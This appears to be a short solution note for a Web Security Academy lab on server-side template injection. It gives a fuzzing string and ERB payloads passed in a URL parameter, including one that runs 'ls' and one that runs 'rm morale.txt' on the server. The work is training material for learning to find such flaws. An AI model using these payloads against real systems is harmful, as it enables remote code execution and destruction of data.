/*

1) Detect

fuzzing ${{<%[%'"}}%\
URL ${7*7}

2) Identify
3) Exploit
    a) Read
    b) Explore
    c) Attack


STEPS:

1) Click on the very first product we get this message:
Unfortunately this product is out of stock 
https://LAB-ID.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock

2) Enter this
https://LAB-ID.web-security-academy.net/?message=<%=7*7%>
//we see 49

3)
https://LAB-ID.web-security-academy.net/?message=<%=system("ls")%>
//morale.txt true 

4) 
https://LAB-ID.web-security-academy.net/?message=<%=system("rm morale.txt")%>

*/